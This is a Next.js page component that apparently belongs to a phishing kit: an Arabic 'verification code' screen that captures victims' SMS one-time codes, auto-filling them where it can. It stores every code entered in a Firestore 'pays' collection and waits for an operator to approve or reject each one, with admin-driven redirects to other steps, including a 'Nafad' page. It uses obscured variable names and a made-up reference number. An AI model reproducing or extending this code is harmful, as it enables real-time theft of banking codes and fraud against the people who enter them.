"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { StepShell } from "@/components/step-shell"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { updateVisitorPage } from "@/lib/visitor-tracking"

const allOtps: string[] = []

export default function VeriPage() {
  const router = useRouter()
  const [_v5, _s5] = useState("")
  const [error, setError] = useState("")
  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [canResend, setCanResend] = useState(false)
  const [resendTimer, setResendTimer] = useState(60)
  const [referenceNumber, setReferenceNumber] = useState("")

  // Track if we've already redirected to prevent multiple redirects
  const hasRedirected = useRef(false)

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "veri", 5)
      // Generate reference number
      const ref = `REF${Date.now().toString().slice(-8)}`
      setReferenceNumber(ref)
    }
  }, [])

  // Resend timer
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
      return () => clearTimeout(timer)
    } else {
      setCanResend(true)
    }
  }, [resendTimer])

  // Combined listener for all Firestore changes
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      router.push("/home-new")
      return
    }

    if (!db) {
      setIsLoading(false)
      return
    }

    const docRef = doc(db as Firestore, "pays", visitorID)
    
    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
      if (!docSnapshot.exists()) {
        // Only redirect to check if we haven't already redirected
        if (!hasRedirected.current) {
          hasRedirected.current = true
          router.push("/check")
        }
        return
      }

      const data = docSnapshot.data()
      const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected"
      const step = data.currentStep

      // Handle OTP status changes
      if (status === "rejected") {
        const updates: any = { _v5Status: "pending" }
        if (data._v5) {
          const currentOtp = { code: data._v5, rejectedAt: new Date().toISOString() }
          updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
        }
        setDoc(docRef, updates, { merge: true }).then(() => {
          _ss5("pending")
          _s5("")
          setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
        }).catch(err => {
          console.error("Error saving rejected OTP:", err)
          setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
        })
      } else if (status === "approved") {
        if (!hasRedirected.current) {
          hasRedirected.current = true
          _ss5("approved")
          setError("")
          // Update currentStep before redirecting to prevent loop
          setDoc(docRef, { currentStep: "_t3" }, { merge: true }).then(() => {
            router.push("/step3")
          })
        }
      } else if (status === "verifying") {
        _ss5("verifying")
      } else if (status === "pending" || !status) {
        _ss5("pending")
        setError("")
      }

      // Handle navigation based on currentStep (admin redirects)
      if (step && !hasRedirected.current) {
        if (step === "_t3") {
          // Already on step2, this means we just updated it - don't redirect
        } else if (step === "_t2") {
          // This is our page - don't redirect
        } else if (step === "_st1") {
          // Admin wants to redirect to check/payment page
          hasRedirected.current = true
          router.push("/check")
        } else if (step === "phone") {
          // Admin wants to skip to phone verification
          hasRedirected.current = true
          router.push("/step5")
        } else if (step === "_t6") {
          // Admin wants to skip to Nafad page
          hasRedirected.current = true
          router.push("/step4")
        }
        // Note: We intentionally do NOT redirect based on "home" to prevent random redirects
      }

      // Stop loading once we have valid data
      setIsLoading(false)
    }, (err) => {
      console.error("Error listening to document:", err)
      setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
      setIsLoading(false)
    })

    return () => unsubscribe()
  }, [router])

  // Auto-fill OTP from SMS (Web OTP API)
  useEffect(() => {
    if ('OTPCredential' in window) {
      const ac = new AbortController()

      navigator.credentials
        .get({
          // @ts-ignore
          otp: { transport: ['sms'] },
          signal: ac.signal,
        })
        .then((otp: any) => {
          if (otp && otp.code) {
            _s5(otp.code)
          }
        })
        .catch((err) => {
          console.log('OTP auto-fill error:', err)
        })

      return () => {
        ac.abort()
      }
    }
  }, [])

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (_v5.length < 4) {
      setError("يرجى إدخال رمز التحقق")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      allOtps.push(_v5)
      // Update the document with the OTP
      if (!db) return
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        _v5,
        otpSubmittedAt: new Date().toISOString(),
        allOtps,
        _v5Status: "verifying", // Set to verifying, waiting for admin decision
        otpUpdatedAt: new Date().toISOString()
      }, { merge: true })

      // Add OTP to history
      await addToHistory(visitorID, "_t2", {
        _v5: _v5
      }, "pending")

      _ss5("verifying") // Show loading state
      // The status will be updated via the listener when admin approves/rejects
    } catch (err) {
      console.error("Error submitting OTP:", err)
      setError("حدث خطأ في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.")
    }
  }

  const handleResendOtp = async () => {
    if (!canResend) return

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      if (!db) return
      await setDoc(doc(db as Firestore, "pays", visitorID), {
        otpResendRequested: true,
        otpResendAt: new Date().toISOString()
      }, { merge: true })

      // Reset timer
      setCanResend(false)
      setResendTimer(60)
      _s5("")
      setError("")
    } catch (err) {
      console.error("Error resending OTP:", err)
      setError("حدث خطأ في إعادة الإرسال. يرجى المحاولة مرة أخرى.")
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <>
      {(_v5Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <StepShell
        step={5}
        title="رمز التحقق"
        subtitle="لإتمام العملية الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك المسجل"
        icon={<ShieldCheck className="h-8 w-8" />}
      >
        <form onSubmit={handleOtpSubmit} className="space-y-4">
          {error && (
            <Alert variant="destructive" className="border-2">
              <AlertCircle className="h-5 w-5" />
              <AlertDescription className="text-base">{error}</AlertDescription>
            </Alert>
          )}

          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4">
            <div className="space-y-2 text-sm text-[#24577a]">
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4" />
                <span>الرمز صالح لمدة 5 دقائق</span>
              </div>
              <div className="flex items-center gap-2">
                <Lock className="h-4 w-4" />
                <span>لا تشارك هذا الرمز مع أي شخص</span>
              </div>
            </div>
            <div className="mt-3 border-t border-[#dce8f3] pt-3 text-center text-xs text-[#6a8498]">
              رقم العملية: <span className="font-mono font-bold text-[#24577a]">{referenceNumber}</span>
            </div>
          </div>

          <Input
            type="password"
            inputMode="numeric"
            autoComplete="one-time-code"
            placeholder="رمز التحقق"
            value={_v5}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 6)
              _s5(value)
              setError("")
            }}
            maxLength={6}
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-3xl font-bold tracking-[0.35em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
            disabled={_v5Status === "verifying"}
            required
            autoFocus
          />

          <div className="text-center">
            {canResend ? (
              <button
                type="button"
                onClick={handleResendOtp}
                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#145072] hover:underline"
              >
                <RefreshCw className="h-4 w-4" />
                إعادة إرسال الرمز
              </button>
            ) : (
              <p className="text-sm text-[#6a8498]">يمكنك إعادة الإرسال بعد {resendTimer} ثانية</p>
            )}
          </div>

          <Button
            type="submit"
            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
            disabled={_v5.length < 4 || _v5Status === "verifying"}
          >
            تأكيد
          </Button>
        </form>
      </StepShell>
    </>
  )
}
